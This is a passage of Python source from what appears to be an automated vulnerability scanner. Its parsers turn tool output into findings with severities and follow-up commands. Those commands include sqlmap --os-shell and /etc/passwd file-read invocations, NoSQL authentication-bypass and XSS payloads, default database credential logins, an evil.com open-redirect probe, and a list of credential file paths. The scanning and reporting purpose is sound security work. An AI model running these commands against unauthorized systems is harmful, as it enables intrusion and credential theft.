            "path":"MySQL :3306",
            "command":"mysql -h <target> -u root"})
    if re.search(r'pgsql.*brute.*\+|postgres.*password.*postgres', output, re.I):
        findings.append({"type":"db_default_cred","severity":"critical",
            "detail":"PostgreSQL default credential (postgres/postgres) accepted",
            "path":"PostgreSQL :5432",
            "command":"psql -h <target> -U postgres"})
    if re.search(r'ms-sql.*sa.*Empty|MSSQL.*sa.*blank', output, re.I):
        findings.append({"type":"db_default_cred","severity":"critical",
            "detail":"MSSQL sa account has empty/blank password",
            "path":"MSSQL :1433",
            "command":"sqlcmd -S <target> -U sa -P ''"})
    if re.search(r'mysqladmin.*uptime|Version.*Uptime', output, re.I):
        findings.append({"type":"db_default_cred","severity":"critical",
            "detail":"MySQL root accessible without password (mysqladmin status success)",
            "path":"MySQL :3306",
            "command":"mysqladmin -h <target> -u root status"})
    if re.search(r'List of databases|postgres=|template0|template1', output, re.I):
        findings.append({"type":"db_default_cred","severity":"critical",
            "detail":"PostgreSQL accessible without password (empty password accepted)",
            "path":"PostgreSQL :5432",
            "command":"PGPASSWORD='' psql -h <target> -U postgres -c '\\l'"})
    return findings

def parse_db_sqli(output):
    findings = []
    sql_errors = [
        r"SQL syntax.*near|syntax error.*at line|mysql_fetch_array|pg_query\(\)|ORA-\d{5}",
        r"SQLSTATE\[\w+\]|PDOException|SQLiteException|Unclosed quotation mark",
        r"Warning.*mysql_|Fatal error.*mysql|Microsoft OLE DB.*error",
    ]
    for pattern in sql_errors:
        if re.search(pattern, output, re.I):
            findings.append({"type":"sql_injection","severity":"critical",
                "detail":"SQL error in response — error-based SQL injection confirmed",
                "path":"/?id= or /login (query parameter)",
                "command":"sqlmap -u 'http://<target>/?id=1' --level=5 --risk=3 --dbs --batch"})
            break
    sleep_m = re.search(r'sleep_probe=([\d.]+)s baseline=([\d.]+)s', output)
    if sleep_m:
        sp, bp = float(sleep_m.group(1)), float(sleep_m.group(2))
        if sp > bp + 2.5:
            findings.append({"type":"blind_sqli","severity":"critical",
                "detail":f"Time-based blind SQLi confirmed: SLEEP probe={sp:.2f}s vs baseline={bp:.2f}s",
                "path":"/?id= (time-based blind)",
                "command":"sqlmap -u 'http://<target>/?id=1' --technique=T --level=5 --dbs"})
    if re.search(r"POST.*'.*\|.*ERROR|username.*'.*login.*error", output, re.I):
        findings.append({"type":"sql_injection","severity":"critical",
            "detail":"SQL error triggered via POST login form — authentication bypass possible",
            "path":"/login (POST body username parameter)",
            "command":"sqlmap -u http://<target>/login --data='username=*&password=test' --level=5"})
    return findings

def parse_db_nosql(output):
    findings = []
    if re.search(r'"(logged_in|success|token|user|data)".*:.*true|\{.*"_id"', output, re.I):
        findings.append({"type":"nosql_injection","severity":"critical",
            "detail":"NoSQL operator injection ($gt/$ne/$regex) bypassed authentication",
            "path":"/login or /api/login (POST body JSON)",
            "command":"curl -X POST -H 'Content-Type: application/json' -d '{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}' http://<target>/login"})
    if re.search(r'\$where.*1==1|where.*true', output, re.I):
        findings.append({"type":"nosql_injection","severity":"critical",
            "detail":"NoSQL $where JS injection accepted — server-side JS execution possible",
            "path":"/api/v1/users (POST body)",
            "command":"curl -X POST -H 'Content-Type: application/json' -d '{\"$where\":\"1==1\"}' http://<target>/api/v1/users"})
    if re.search(r'requirepass.*\(empty\)|requirepass\s+$', output, re.I):
        findings.append({"type":"redis_no_auth","severity":"critical",
            "detail":"Redis requirepass is empty — no authentication configured",
            "path":"Redis :6379 (CONFIG GET requirepass)",
            "command":"redis-cli -h <target> CONFIG GET requirepass"})
    if re.search(r'KEYS.*\*.*:\d+|KEYS.*session|KEYS.*user|KEYS.*token', output, re.I):
        findings.append({"type":"redis_data_exposure","severity":"high",
            "detail":"Redis KEYS enumeration returned session/user/token data",
            "path":"Redis :6379 (KEYS *)",
            "command":"redis-cli -h <target> KEYS '*'"})
    return findings

def parse_db_privesc(output):
    findings = []
    if re.search(r'FILE_PRIV.*Y|super_priv.*Y|grant_priv.*Y', output, re.I):
        findings.append({"type":"db_excessive_priv","severity":"critical",
            "detail":"MySQL FILE/SUPER/GRANT privilege granted — potential OS file read/write and privilege escalation",
            "path":"MySQL :3306 (SHOW GRANTS)",
            "command":"mysql -h <target> -u <user> -e 'SHOW GRANTS FOR CURRENT_USER()'"})
    if re.search(r'log.*OFF|general_log.*OFF|slow_query_log.*OFF', output, re.I):
        findings.append({"type":"db_no_audit_log","severity":"medium",
            "detail":"MySQL query logging disabled — no audit trail for malicious queries",
            "path":"MySQL :3306 (SHOW VARIABLES)",
            "command":"mysql -h <target> -u root -e \"SHOW VARIABLES LIKE '%log%'\""})
    if re.search(r'ssl_type.*\s*$|have_ssl.*DISABLED|have_ssl.*NO', output, re.I):
        findings.append({"type":"db_unencrypted_conn","severity":"high",
            "detail":"Database connections not encrypted — traffic readable in transit",
            "path":"MySQL/PostgreSQL (SSL status)",
            "command":"mysql -h <target> -e 'SHOW VARIABLES LIKE \\'%ssl%\\''"})
    if re.search(r'(SQL syntax|ORA-|SQLSTATE|mysql_error|pg_query.*fail)', output, re.I):
        findings.append({"type":"verbose_db_error","severity":"medium",
            "detail":"Verbose DB error message in HTTP response — DBMS type/version disclosed",
            "path":"/?id=' (error response)",
            "command":"curl -sk 'http://<target>/?id=1\\'' | grep -iE 'sql|mysql|postgres|oracle'"})
    if re.search(r'ssl.*disabled|encrypted.*false|cipher.*none', output, re.I):
        findings.append({"type":"db_unencrypted_conn","severity":"high",
            "detail":"Database connection unencrypted — data at rest and in transit unprotected",
            "path":"DB port (TLS check)",
            "command":"nmap --script=mysql-ssl -p 3306 <target>"})
    return findings


# ─────────────────────────────────────────────────────────────────────────────
# DISPATCHER
# ─────────────────────────────────────────────────────────────────────────────

def parse_sqlmap(output):
    findings = []
    # Detected injection type
    for line in output.splitlines():
        ll = line.lower()
        # Injection confirmed lines
        if re.search(r'(parameter|place).*appears to be.*injectable|sqlmap identified.*injection point', line, re.I):
            param_m = re.search(r"Parameter: '?([^']+)'? \(", line)
            param = param_m.group(1) if param_m else 'unknown parameter'
            findings.append({"type":"sql_injection","severity":"critical",
                "detail":f"sqlmap confirmed SQL injection: {line.strip()[:150]}",
                "path":f"/?{param}= or form field",
                "command":f"sqlmap -u 'http://<target>/?{param}=1' --batch --level=5 --risk=3 --dbs"})
        # Technique identified
        if re.search(r"Type: (boolean-based|error-based|time-based|UNION query|stacked queries|inline query)", line, re.I):
            tech_m = re.search(r"Type: (.+)", line)
            tech = tech_m.group(1) if tech_m else line.strip()
            findings.append({"type":"sqli_technique","severity":"critical",
                "detail":f"SQLi technique confirmed: {tech}",
                "path":"injection point",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --technique=BEUSTQ --dbs"})
        # DBMS fingerprint
        if re.search(r"back-end DBMS:", line, re.I):
            findings.append({"type":"db_fingerprint","severity":"high",
                "detail":f"Database fingerprinted: {line.strip()}",
                "path":"server",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --banner --current-db"})
        # Current user
        if re.search(r"current user is|current user:", line, re.I):
            findings.append({"type":"db_user_disclosed","severity":"high",
                "detail":f"DB user: {line.strip()}",
                "path":"database",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --current-user"})
        # Databases
        if re.search(r"available databases|found.*database", line, re.I):
            findings.append({"type":"db_enumerated","severity":"high",
                "detail":f"Databases enumerated: {line.strip()[:120]}",
                "path":"information_schema",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --dbs"})
        # DBA privilege
        if re.search(r"current user is DBA|running as DBA", line, re.I):
            findings.append({"type":"db_dba_privilege","severity":"critical",
                "detail":"sqlmap confirmed current DB user has DBA privileges",
                "path":"database privilege",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --privileges"})
        # File system access
        if re.search(r"file-read|INTO OUTFILE|INTO DUMPFILE|file privilege", line, re.I):
            findings.append({"type":"sqli_file_access","severity":"critical",
                "detail":"SQL injection allows file system read/write (FILE privilege confirmed)",
                "path":"server filesystem via SQL",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --file-read='/etc/passwd'"})
        # OS shell
        if re.search(r"os-shell|command execution|xp_cmdshell", line, re.I):
            findings.append({"type":"sqli_os_rce","severity":"critical",
                "detail":"SQL injection may allow OS command execution (os-shell / xp_cmdshell)",
                "path":"OS via SQL injection",
                "command":"sqlmap -u 'http://<target>/?id=1' --batch --os-shell"})
        # Second-order detected
        if re.search(r"second.order|stored.injection|second order", line, re.I):
            findings.append({"type":"second_order_sqli","severity":"critical",
                "detail":"Second-order (stored) SQL injection detected",
                "path":"input stored then triggered",
                "command":"sqlmap -u 'http://<target>/' --second-url='http://<target>/profile' --batch"})
    return findings

def parse_nuclei(output):
    findings = []
    for line in output.splitlines():
        # nuclei output format: [template-id] [severity] url
        m = re.match(r'\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)\s*(.*)', line)
        if m:
            tmpl, proto, sev_raw, url, extra = m.group(1), m.group(2), m.group(3), m.group(4), m.group(5)
            sev = sev_raw.lower().strip()
            if sev not in ('critical','high','medium','low','info'):
                sev = 'medium'
            path = re.sub(r'https?://[^/]+', '', url) or '/'
            findings.append({"type":"nuclei_finding","severity":sev,
                "detail":f"[{tmpl}] {extra.strip() or proto} at {url}",
                "path":path,
                "command":f"nuclei -u http://<target> -t {tmpl}"})
        # alternate format: [severity] [template] detail
        elif re.match(r'\[(critical|high|medium|low)\]', line, re.I):
            sev_m = re.match(r'\[(\w+)\]', line)
            sev = sev_m.group(1).lower() if sev_m else 'medium'
            if sev in ('critical','high','medium','low'):
                findings.append({"type":"nuclei_finding","severity":sev,
                    "detail":line.strip()[:200],"path":"web application",
                    "command":"nuclei -u http://<target> -severity " + sev})
    return findings

def parse_subdomains(output, sess):
    """Only pre-validated resolvable subdomains become findings — crt.sh /
    dnsrecon candidate lines are printed but never emitted (no resolution
    proof). Everything here is informational."""
    findings = []
    seen = set()
    target = str(sess.get('target', ''))
    tgt = re.escape(target) if target else r'[a-z0-9.-]+'
    for line in output.splitlines():
        m = re.search(r'(?i)([a-z0-9_-]+\.' + tgt + r')\s*->\s*([0-9.]+)', line)
        if m:
            name, ip = m.group(1), m.group(2)
            if name in seen: continue
            seen.add(name)
            findings.append({"type": "subdomain", "severity": "info",
                "detail": f"Resolved subdomain: {name} -> {ip}",
                "path": name, "command": f"dig +short {name} A"})
            continue
        m = re.search(r'\[\+\]\s+A\s+([a-z0-9_.-]+\.' + tgt + r')\s+([0-9.]+)', line, re.I)
        if m:
            name, ip = m.group(1), m.group(2)
            if name in seen: continue
            seen.add(name)
            findings.append({"type": "subdomain", "severity": "info",
                "detail": f"dnsrecon A record: {name} -> {ip}",
                "path": name, "command": f"dig +short {name} A"})
    return findings

def parse_breach_osint(output, sess):
    """Breach findings require a real HIBP 200 breach response (COMPROMISED:).
    Discovered emails are informational; NO_BREACH lines show the lookup ran
    and returned clean, which is itself worth recording."""
    findings = []
    target = str(sess.get('target', ''))
    emails = set()
    for line in output.splitlines():
        s = line.strip()
        if s.startswith('COMPROMISED:'):
            rest = s.split(':', 1)[1]
            email, _, breaches = rest.partition('|')
            if email:
                findings.append({"type": "breach_exposure", "severity": "critical",
                    "path": email,
                    "detail": f"Email {email} appears in breaches (HIBP v3): {breaches[:120]}",
                    "command": "PWM_HIBP_KEY set — haveibeenpwned breachedaccount lookup"})
        elif s.startswith('NO_BREACH:'):
            email = s.split(':', 1)[1]
            if email:
                findings.append({"type": "no_breach", "severity": "info",
                    "path": email,
                    "detail": f"HIBP check ran for {email} — no breach found",
                    "command": "haveibeenpwned breachedaccount lookup"})
        elif re.search(r'[a-z0-9._%+-]+@[a-z0-9.-]+', s):
            em = re.match(r'[a-z0-9._%+-]+@[a-z0-9.-]+', s)
            if em:
                emails.add(em.group(0))
    if target and target.replace('.', '').isalnum() and len(emails) <= 200:
        for em in sorted(emails)[:40]:
            domain = em.split('@', 1)[1] if '@' in em else ''
            if domain and (domain.endswith(target) or domain.endswith('.' + target)):
                findings.append({"type": "email_discovered", "severity": "info",
                    "path": em, "detail": f"Employee email discovered via theHarvester: {em}",
                    "command": "theHarvester -d <target> -b all"})
    return findings

def _js_bundle_url(src, target):
    """Real URL of a JS bundle reference as written in the page."""
    if src.startswith('http://') or src.startswith('https://'):
        return src
    if src.startswith('/'):
        return f'http://{target}{src}'
    return f'http://{target}/{src}'


def parse_js_leak(output, sess):
    """High findings only for real secret-format matches (SECRET:<kind>:<value>);
    endpoints and sourcemaps are informational. Paths and commands reference
    the real bundle URLs the scan fetched — never placeholder text."""
    findings = []
    seen_secrets = set()
    seen_eps = set()
    srcs = []
    section = ''
    target = (sess or {}).get('target', '')
    for line in output.splitlines():
        s = line.strip()
        if s.startswith('=====') and s.endswith('====='):
            section = s.strip('=')
            continue
        if not s:
            continue
        if section == 'JS-SRC-LIST':
            srcs.append(s)
            continue
        if s.startswith('SECRET:'):
            _, kind, value = s.split(':', 2)
            key = (kind, value[:40])
            if key in seen_secrets: continue
            seen_secrets.add(key)
            js_url = _js_bundle_url(srcs[0], target) if srcs else ''
            findings.append({"type": "js_secret_leak", "severity": "high",
                "path": re.sub(r'^https?://[^/]+', '', js_url) if js_url else '-',
                "detail": f"Possible {kind} secret in JS bundle"
                          + (f" ({js_url})" if js_url else "") + f": {value[:70]}",
                "command": f"curl -sk {js_url}" if js_url else ""})
            continue
        if s.startswith('MAP:'):
            u = s.split(':', 1)[1]
            findings.append({"type": "sourcemap_exposed", "severity": "info",
                "path": re.sub(r'^https?://[^/]+', '', u) or '/',
                "detail": f"Sourcemap file reachable — original source may be recoverable: {u}",
                "command": f"curl -sk {u}"})
            continue
        if section != 'JS-ENDPOINTS':
            continue
        if len(seen_eps) >= 30: continue
        ep = re.match(r'^((?:/|https?://)[^ ]+)$', s)
        if ep and ('/api/' in s or '/v1/' in s or '/v2/' in s or '/graphql' in s or '/rest' in s):
            if s in seen_eps: continue
            seen_eps.add(s)
            js_url = _js_bundle_url(srcs[0], target) if srcs else ''
            findings.append({"type": "js_endpoint", "severity": "info",
                "path": s, "detail": f"API endpoint extracted from JS bundle: {s}",
                "command": f"curl -sk {js_url}" if js_url else ""})
    return findings

# product-version regex -> CPE (vendor, product) mappings for NVD verification.
# Only products with a known vendor/product CPE are cross-referenced; anything
# else is reported nowhere rather than guessed.
CPE_PATTERNS = [
    (r'OpenSSH[_\s-]?([\d.]+)',           ('openbsd', 'openssh'), 'OpenSSH'),
    (r'Apache httpd[ /\-]?([\d.]+)',      ('apache', 'http_server'), 'Apache'),
    (r'nginx/([\d.]+)',                   ('nginx', 'nginx'), 'nginx'),
    (r'MySQL[ /]([\d.]+)',                ('oracle', 'mysql'), 'MySQL'),
    (r'MariaDB[ /]([\d.]+)',              ('mariadb', 'mariadb'), 'MariaDB'),
    (r'PostgreSQL[ /]([\d.]+)',           ('postgresql', 'postgresql'), 'PostgreSQL'),
    (r'redis[ -]?server[ =\w/]*([\d.]+)|redis_version[^\d]*([\d.]+)', ('redis', 'redis'), 'Redis'),
    (r'MongoDB[ /]([\d.]+)',              ('mongodb', 'mongodb'), 'MongoDB'),
    (r'Tomcat/([\d.]+)',                  ('apache', 'tomcat'), 'Tomcat'),
    (r'vsftpd[ /]([\d.]+)',               ('vsftpd', 'vsftpd'), 'vsftpd'),
    (r'ProFTPD[ /]([\d.]+)',              ('proftpd', 'proftpd'), 'ProFTPD'),
    (r'PHP[ /]([\d.]+)',                  ('php', 'php'), 'PHP'),
    (r'OpenSSL[ /]([\d.]+[a-z]?)',        ('openssl', 'openssl'), 'OpenSSL'),
    (r'Samba[ /]([\d.]+)',                ('samba', 'samba'), 'Samba'),
    (r'Jenkins[ :](\d+)',                 ('jenkins', 'jenkins'), 'Jenkins'),
]

def parse_version_cve(output, sess):
    """Cross-references each nmap service/version pairing against the NVD
    cpeName API. Findings are emitted only for CVEs NVD assigns to that exact
    product+version CPE, carrying NVD's real CVSS vector; the finding severity
    is derived from that score's band."""
    findings = []
    for line in output.splitlines():
        if not re.search(r'\d+/tcp\s+open', line):
            continue
        port_m = re.search(r'(\d+)/tcp', line)
        path = f":{port_m.group(1)}" if port_m else "service"
        for pat, (vend, prod), tok in CPE_PATTERNS:
            m = re.search(pat, line, re.I)
            if not m:
                continue
            ver = next((g for g in m.groups() if g), None)
            if not ver:
                continue
            ver = re.match(r'(\d+(?:\.\d+){1,3})', ver).group(1)
            nvd = _nvd_verify_cpe(f"{vend}:{prod}", ver)
            for c in nvd[:5]:
                band = cvss31_band(c['score'])
                sev = band if band in ('critical', 'high', 'medium') else 'low'
                findings.append({"type": "cve", "severity": sev, "path": path,
                    "detail": f"{tok} {ver} — {c['cve']} (CVSS {c['score']}, NVD-verified) — {c['reference'][:80]}",
                    "command": f"nmap -sV -p {path.lstrip(':')} <target>",
                    "cvss": {"vector": c['vector'], "base_score": c['score'],
                             "severity_band": band, "band_mismatch": False,
                             "source": "nvd-cpe-verified"}})
            break
    return findings

def parse_tech(output, sess):
    """whatweb plugin enumerations and nuclei [tech] hits are informational —
    a technology fingerprint is not, by itself, a vulnerability."""
    findings = []
    seen = set()
    for line in output.splitlines():
        s = line.strip()
        m = re.match(r'^(https?://\S+)\s+\[.*?\](.*)', s)
        if m and 'whatweb' not in s.lower():
            url = m.group(1)
            for tok in re.findall(r'([A-Za-z0-9][A-Za-z0-9+_.-]*)\[([^\]\[]{0,30})\]', m.group(2)):
                name, ver = tok
                key = (name, ver)
                if key in seen: continue
                seen.add(key)
                path = re.sub(r'https?://[^/]+', '', url) or '/'
                detail = f"{name}" + (f" version {ver}" if ver and ver != '0' else "")
                findings.append({"type": "tech_fingerprint", "severity": "info",
                    "detail": f"{detail} at {url}", "path": path,
                    "command": f"whatweb -a 3 {url}"})
            continue
        m = re.match(r'^\[([^\]]+)\]\s+(https?://\S+)', s)
        if m and m.group(1).lower() not in ('info',):
            tech, url = m.group(1), m.group(2)
            if tech in seen: continue
            seen.add(tech)
            path = re.sub(r'https?://[^/]+', '', url) or '/'
            findings.append({"type": "tech_fingerprint", "severity": "info",
                "detail": f"{tech} detected at {url}", "path": path,
                "command": f"nuclei -u {url} -t http/technologies"})
        if len(findings) >= 15:
            break
    return findings

PROVIDER_PATTERNS = [
    (r'cf-ray|^server:.*cloudflare', 'Cloudflare (CDN/WAF)'),
    (r'x-amz-|x-amz-cf-|x-amz-apigw', 'Amazon Web Services (S3/CloudFront/API Gateway)'),
    (r'x-azure-|azurewebsites', 'Microsoft Azure'),
    (r'x-gcs-|x-goog-|google.*storage', 'Google Cloud Platform'),
    (r'x-sucuri', 'Sucuri (CDN/WAF)'),
]

def parse_cloud(output, sess):
    """CDN/cloud provider fingerprinting and well-known endpoint baseline. All
    informational: a provider header or a reachable path is not a vuln."""
    findings = []
    prov = set()
    for line in output.splitlines():
        for pat, label in PROVIDER_PATTERNS:
            if re.search(pat, line, re.I):
                m = re.match(r'^([A-Za-z0-9-]+):\s*(.*)', line.strip())
                header = f" ({m.group(1)}: {m.group(2)[:40]})" if m else ''
                key = label
                if key not in prov:
                    prov.add(key)
                    findings.append({"type": "cloud_provider", "severity": "info",
                        "detail": f"Cloud/CDN provider detected: {label}{header}",
                        "path": "/", "command": "curl -skI http://<target>"})
                break
        w = re.match(r'^(\.well-known/[^ ]+|\S+\.txt)\s+->\s*(\d{3})', line.strip())
        if w and w.group(2) == '200':
            findings.append({"type": "cloud_endpoint", "severity": "info",
                "detail": f"Baseline probe {w.group(1)} returned HTTP 200",
                "path": f"/{w.group(1)}", "command": f"curl -sk -o /dev/null -w '%{{http_code}}' http://<target>/{w.group(1)}"})
    return findings

def parse_ad_enum(output, sess):
    """Anonymous LDAP bind / naming-context exposure is a recon baseline —
    reported as informational context, never as an assumed takeover."""
    findings = []
    text = output
    if re.search(r'[Nn]amingContexts[:\s]*(DC=|dn:)', text):
        findings.append({"type": "ad_enum", "severity": "info",
            "detail": "LDAP anonymous base query returned naming contexts — directory data visible unauthenticated",
            "path": "ldap://<target>", "command": "ldapsearch -x -H ldap://<target> -s base namingContexts"})
    if re.search(r'result:\s*0\s+Success', text, re.I) and re.search(r'DC=', text, re.I):
        findings.append({"type": "ad_enum", "severity": "info",
            "detail": "Active Directory naming context responded to anonymous LDAP probe",
            "path": "ldap://<target>", "command": "ldapsearch -x -H ldap://<target> -s base dn"})
    return findings

def parse_evidence(output, sess):
    return []

def parse_assess(output, sess):
    return []

def parse_xss_probe(output):
    findings = []
    for line in output.splitlines():
        # XSS reflection
        if re.search(r'onerror|alert\(|<script', line, re.I) and re.search(r'\d{3}', line):
            param_m = re.search(r'(\w+)\s+XSS\s+(\d+):\s*(\S+)', line)
            if param_m:
                param, code, refl = param_m.group(1), param_m.group(2), param_m.group(3)
                if refl and refl != 'None':
                    findings.append({"type":"xss_reflected","severity":"high",
                        "detail":f"XSS payload reflected via parameter '{param}' (HTTP {code}): {refl}",
                        "path":f"/?{param}=<payload>",
                        "command":f"curl -sk 'http://<target>/?{param}=<script>alert(1)</script>'"})
        # Open redirect
        if re.search(r'location.*evil\.com|location.*https?://', line, re.I):
            param_m = re.search(r'(\w+):\s*(Location.*evil)', line, re.I)
            if param_m:
                findings.append({"type":"open_redirect","severity":"medium",
                    "detail":f"Open redirect via '{param_m.group(1)}' parameter: {param_m.group(2)[:80]}",
                    "path":f"/?{param_m.group(1)}=https://evil.com",
                    "command":f"curl -skI 'http://<target>/?{param_m.group(1)}=https://evil.com'"})
        # XXE
        if re.search(r'root:.*:/bin/|xxe.*success|SYSTEM.*file://', line, re.I):
            findings.append({"type":"xxe_injection","severity":"critical",
                "detail":"XXE injection confirmed — /etc/passwd content returned",
                "path":"/ (XML POST body — xxe entity in DOCTYPE)",
                "command":"curl -X POST -d @xxe.xml http://<target>/ (see remediation for payload)"})
    return findings

def parse_cms_scan(output):
    findings = []
    # WordPress: the login page must actually render WP fingerprints — a bare
    # 200 on /wp-login.php is not proof a CMS is installed.
    wpm = re.search(r'wp-login:(\d{3})\|(.*)', output)
    if wpm and wpm.group(1) not in REDIRECT_CODES and \
       re.search(r'name="log"|wp-submit|wordpress|wp-content', wpm.group(2), re.I):
        findings.append({"type": "cms_wordpress", "severity": "medium",
            "detail": "WordPress installation detected",
            "path": "/wp-login.php",
            "command": "wpscan --url http://<target> --enumerate vp,u,m"})
    # WordPress user enumeration
    if re.search(r'"id":\s*\d+.*"name":|wp/v2/users.*200', output, re.I):
        findings.append({"type": "wp_user_enum", "severity": "high",
            "detail": "WordPress REST API exposes user enumeration at /wp-json/wp/v2/users",
            "path": "/wp-json/wp/v2/users",
            "command": "curl -sk http://<target>/wp-json/wp/v2/users"})
    # WPScan findings
    for line in output.splitlines():
        if re.search(r'\[!\]|\[i\].*found|vulnerability|outdated|CVE-', line, re.I):
            sev = ('critical' if 'critical' in line.lower() else
                   'high' if any(x in line.lower() for x in ['vulnerability','exploit','rce','cve-','outdated plugin']) else 'medium')
            findings.append({"type":"cms_vulnerability","severity":sev,
                "detail":line.strip()[:200],"path":"WordPress",
                "command":"wpscan --url http://<target> --enumerate vp,u --plugins-detection aggressive"})
    # Drupal: CHANGELOG version line or the login form fingerprint (body, not
    # status) — a 200 on a redirect-to-HTTPS catch-all is no detection.
    drupal_evidence = re.search(r'Drupal\s+\d+\.\d+|SA-CORE-\d{4}-\d{4}', output, re.I)
    dm = re.search(r'drupal_login:(\d{3})\|(.*)', output)
    if drupal_evidence or (dm and dm.group(1) not in REDIRECT_CODES and
            re.search(r'user-login-form|form_id.*user_login|drupal', dm.group(2), re.I)):
        findings.append({"type": "cms_drupal", "severity": "medium",
            "detail": "Drupal CMS detected — check for Drupalgeddon (SA-CORE-2018-002)",
            "path": "/CHANGELOG.txt or /user/login",
            "command": "droopescan scan drupal -u http://<target>"})
    # Joomla: admin panel requires its form/module fingerprint in the body.
    jm = re.search(r'joomla_admin:(\d{3})\|(.*)', output)
    if jm and jm.group(1) not in REDIRECT_CODES and \
       re.search(r'mod-login|com_login|joomla|user\s*name.*password', jm.group(2), re.I):
        findings.append({"type": "cms_joomla", "severity": "medium",
            "detail": "Joomla CMS admin panel detected",
            "path": "/administrator/",
            "command": "joomscan --url http://<target>"})
    return findings

def parse_cred_harvest(output):
    findings = []
    secret_paths = {
        '.env': ('env_exposed', 'critical', '.env file exposed — credentials, API keys at risk'),
        '.env.local': ('env_exposed', 'critical', '.env.local exposed'),
        '.env.backup': ('env_exposed', 'critical', '.env.backup exposed — old credentials'),
        'wp-config.php': ('wp_config', 'critical', 'wp-config.php accessible — DB credentials exposed'),
        'config.php': ('config_exposed', 'critical', 'config.php accessible'),
        'config/database.yml': ('db_config', 'critical', 'database.yml accessible — Rails DB credentials'),
        'application.properties': ('app_props', 'high', 'application.properties exposed — Spring Boot config'),
        'secrets.yaml': ('secrets_exposed', 'critical', 'secrets.yaml exposed'),
        '.aws/credentials': ('aws_creds', 'critical', 'AWS credentials file exposed'),
        'id_rsa': ('ssh_key', 'critical', 'SSH private key exposed'),
        '.ssh/id_rsa': ('ssh_key', 'critical', 'SSH private key at .ssh/id_rsa exposed'),
        'backup.sql': ('db_backup', 'critical', 'SQL database backup exposed'),
        'database.sql': ('db_backup', 'critical', 'database.sql exposed'),
        '.git/COMMIT_EDITMSG': ('git_exposed', 'high', 'Git repository exposed — source code at risk'),
        '.git/config': ('git_config', 'high', 'Git config exposed — may contain remote credentials'),
    }
    # Content evidence per sensitive file: an HTTP 200 alone proves nothing
    # (catch-all routers return 200 for any path). The probe returns the body
    # (following redirects), so only the actual artifact — real .env syntax, a
    # PEM private key, an ini-section git config — becomes a finding.
    evidence_map = {
        '.env': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
        '.env.local': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
        '.env.backup': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
        'wp-config.php': r'define\s*\(|DB_NAME|DB_PASSWORD|DB_HOST|table_prefix',
        'config.php': r'["\'](?:db|DB_|host|user|password|secret|app_key|key)["\']\s*=>',
        'config/database.yml': r'(?:username|password|database|adapter)\s*:\s*\S',
        'application.properties': r'(?:spring|jdbc|password|secret|api[_-]?key|access[_-]?key)\s*[=:]',
        'secrets.yaml': r'(?:secret|api[_-]?key|token|password)\s*:\s*\S',
        '.aws/credentials': r'aws_access_key_id|aws_secret_access_key|\[(?:default|profile)\b',
        'id_rsa': r'PRIVATE KEY-----',
        '.ssh/id_rsa': r'PRIVATE KEY-----',
        'backup.sql': r'CREATE TABLE|INSERT INTO|DROP TABLE|CREATE DATABASE',
        'database.sql': r'CREATE TABLE|INSERT INTO|DROP TABLE|CREATE DATABASE',
        '.git/config': r'\[(?:core|remote|branch|user)\]|repositoryformatversion',
    }
    secret_keys_sorted = sorted(secret_paths, key=len, reverse=True)
    for line in output.splitlines():
        m = re.search(r'([^:|]+):(\d{3})\|(.*)', line)
        if not m:
            continue
        path_key, code, body = m.group(1).strip(), m.group(2), m.group(3)
        if code in REDIRECT_CODES or code not in ('200', '201', '204'):
            continue
        for key in secret_keys_sorted:
            if key in path_key:
                rex = evidence_map.get(key)
                if rex and not re.search(rex, body, re.I):
                    break
                ftype, sev, msg = secret_paths[key]
                findings.append({"type": ftype, "severity": sev,
                    "detail": f"{msg} (HTTP {code})",
                    "path": f"/{path_key}",
                    "command": f"curl -skL http://<target>/{path_key}"})
                break
    # Git content exposure (evidence-based: real ini sections / remote URLs)
    if re.search(r'remote.*url.*github|remote.*url.*gitlab|remote.*url.*bitbucket', output, re.I):
        findings.append({"type":"git_remote_exposed","severity":"high",
            "detail":"Git remote URL leaked in .git/config — repository URL and potential credentials disclosed",
            "path":"/.git/config",
            "command":"curl -sk http://<target>/.git/config"})
    if re.search(r'\[(core|remote|branch)\]', output, re.I):
        findings.append({"type":"git_config_content","severity":"high",
            "detail":"Git config content accessible — project metadata and remote URLs visible",
            "path":"/.git/config",
            "command":"git clone http://<target>/.git /tmp/dumped_repo"})
    return findings

def _normalize_findings(findings, sess, sub_id):
    """Real-target normalization: findings must reference the user's actual
    target and the command that actually ran — never <target> placeholders,
    other unresolved placeholders, or empty/junk commands.
    Also drops any negated-result finding ("not vulnerable" style) so it can
    never reach /status, SSE, the PDF or the findings popups."""
    findings[:] = [f for f in findings
                   if not any(isinstance(f.get(k), str) and _NEGATED_RESULT.search(f[k])
                              for k in ('detail', 'line', 'title', 'cve'))]
    real_target = sess.get('target', '')
    real_cmd = sess['commands'].get(sub_id, '')
    for f in findings:
        for key in ('command', 'detail', 'path'):
            val = f.get(key)
            if isinstance(val, str) and '<target>' in val:
                f[key] = val.replace('<target>', real_target)
        cmd = str(f.get('command') or '').strip()
        if not cmd or cmd.lower() in ('manual review', 'msfconsole -q') \
                or re.search(r'<[^<>\n]{1,60}>', cmd):
            f['command'] = real_cmd
        pth = f.get('path')
        if isinstance(pth, str) and re.search(r'<[^<>\n]{1,60}>', pth):
            f['path'] = '-'
        score_finding(f)        # CVSS v3.1 vector + base score (choke point)
        _triage_finding(f)      # automated false-positive verdict (choke point)
    _append_triage_log(sess, sub_id, findings)
    return findings


def dispatch_parser(parse_type, output, sess):
    parsers = {
        "nmap": parse_nmap, "vulners": parse_vulners,
        "searchsploit": parse_searchsploit, "nikto": parse_nikto,
        "ssl": parse_ssl, "headers": parse_headers, "smb": parse_smb,
        "snmp": parse_snmp, "dirb": parse_dirb,
        "banner_anomaly": parse_banner_anomaly,
        "http_anomaly": parse_http_anomaly, "timing": parse_timing,
        "auth_probe": parse_auth_probe, "nse_deep": parse_nse_deep,
        "hydra": parse_hydra, "msf": parse_msf, "generic": parse_generic,
